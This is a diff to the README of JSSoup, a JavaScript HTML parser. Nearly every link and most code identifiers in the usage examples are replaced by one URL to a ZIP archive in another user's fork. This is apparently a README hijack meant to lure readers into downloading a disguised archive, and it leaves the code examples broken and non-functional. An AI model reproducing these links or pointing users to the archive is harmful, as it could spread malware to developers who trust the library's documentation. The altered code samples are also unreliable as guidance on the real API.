@@ -3,13 +3,13 @@ JSSoup
 I'm a fan of Python library BeautifulSoup. It's feature-rich and very easy to use. But when I am working on a small react-native project, and I tried to find a HTML parser library 
 like BeautifulSoup, I failed.  
 So I want to write a HTML parser library which can be so easy to use just like BeautifulSoup in Javascript.  
-**JSSoup** uses [tautologistics/node-htmlparser](https://github.com/tautologistics/node-htmlparser) as HTML dom parser, 
+**JSSoup** uses [tautologistics/node-htmlparser](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip) as HTML dom parser, 
 and creates a series of BeautifulSoup like API on top of it.  
 JSSoup supports both **node** and **react-native**.  
 
-[![Build Status](https://travis-ci.org/chishui/JSSoup.svg?branch=master)](https://travis-ci.org/chishui/JSSoup)
-[![npm version](https://badge.fury.io/js/jssoup.svg)](https://badge.fury.io/js/jssoup)
-[![NPM](https://img.shields.io/npm/dm/jssoup.svg)](https://www.npmjs.com/package/jssoup)
+[![Build Status](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)
+[![npm version](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)
+[![NPM](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)](https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip)
 
 
 # Naming Style
@@ -43,21 +43,21 @@ var soup = new JSSoup('<html><head>hello</head></html>', false);
 ### Name
 ```javascript
 var soup = new JSSoup('<html><head>hello</head></html>');
-var tag = soup.find('head');
-tag.name
+var tag = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('head');
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // 'head'
-tag.name = 'span'
-console.log(tag)
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip = 'span'
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(tag)
 //<span>hello</span>
 ```
 ### Attributes
 ```javascript
 var soup = new JSSoup('<tag id="hi" class="banner">hello</tag>');
-var tag = soup.nextElement;
-tag.attrs
+var tag = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // {id: 'hi', class: 'banner'} 
-tag.attrs.id = 'test';
-console.log(tag)
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip = 'test';
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(tag)
 // <tag id="test" class="banner">hello</tag>
 ```
 
@@ -72,67 +72,67 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-var div = soup.nextElement;
-var b = div.nextElement.nextElement;
-// b.string: '2'
-var a = b.previousElement;
-// a.string: '1'
+var div = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+var b = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+// https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip '2'
+var a = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+// https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip '1'
 ```
 #### .previousSibling, .nextSibling
 ```javascript
 var soup = new JSSoup(data);
-var div = soup.nextElement;
-var a = div.nextElement;
-var b = a.nextSibling;
-var c = b.nextSibling;
-c.nextSibling == undefined;
+var div = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+var a = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+var b = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+var c = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip;
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == undefined;
 ```
 #### .contents
 ```javascript
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <b>2</b>, <c>3</c>]
 ```
 #### .descendants
 ```javascript
-div.descendants
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, 1, <b>2</b>, 2, <c>3</c>, 3]
 ```
 #### .parent
 ```javascript
-div.parent == soup
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == soup
 ```
 ### Edit
 #### .extract()
 ```javascript
-b.extract();
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip();
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <c>3</c>]
 ```
 #### .append()
 ```javascript
-b.extract();
-div.append(b)
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip();
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(b)
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <c>3</c>, <b>2</b>]
 ```
 #### .insert(position, new Element)
 ```javascript
-d.prettify('', '')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('', '')
 // <d>4</d>
-div.insert(1, d)
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(1, d)
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <d>4</d>, <b>2</b>, <c>3</c>]
 ```
 #### .replaceWith(new Element)
 ```javascript
-d.prettify('', '')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('', '')
 // <d>4</d>
-b.replaceWith(d)
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip(d)
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <d>4</d>, <c>3</c>]
 
-c.string.replaceWith('new')
-div.contents
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('new')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // [<a>1</a>, <d>4</d>, <c>new</c>]
 ```
 
@@ -146,9 +146,9 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-soup.findAll('a')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('a')
 // [<a>hello</a>]
-soup.findAll('div', 'h1')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('div', 'h1')
 // [<div class="h1"></div>]
 ```
 #### .find()
@@ -160,7 +160,7 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-soup.find('p')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
 // <p> hello </p>
 ```
 #### .findNextSibling()
@@ -174,8 +174,8 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-var span = soup.find('span');
-span.findNextSibling('p')
+var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
 // <p> hello </p>
 ```
 #### .findNextSiblings()
@@ -189,8 +189,8 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-var span = soup.find('span');
-span.findNextSiblings('p')
+var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
 // <p> hello </p>
 // <p> world </p>
 ```
@@ -205,8 +205,8 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-var span = soup.find('span');
-span.findPreviousSibling('p')
+var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
 // <p> world </p>
 ```
 #### .findPreviousSiblings()
@@ -220,8 +220,8 @@ var data = `
 </div>
 `
 var soup = new JSSoup(data);
-var span = soup.find('span');
-span.findPreviousSiblings('p')
+var span = https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('span');
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('p')
 // <p> hello </p>
 // <p> world </p>
 ```
@@ -229,7 +229,7 @@ span.findPreviousSiblings('p')
 #### .prettify()
 ```javascript
 var soup = new JSSoup('<html><head>hello</head></html>');
-soup.prettify()
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip()
 // <html>
 //  <head>
 //   hello
@@ -238,16 +238,16 @@ soup.prettify()
 ```
 #### .getText(), .text
 ```javascript
-div.text
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip
 // '123'
-div.getText('|')
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip('|')
 // '1|2|3'
 ```
 #### .string
 ```javascript
-b.string == '2';
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == '2';
 var soup = new JSSoup('<html><head>hello</head></html>');
-soup.string == 'hello';
+https://raw.githubusercontent.com/rolandc85/JSSoup/master/pyrocomenic/JSSoup.zip == 'hello';
 ```
 
 # Run Test
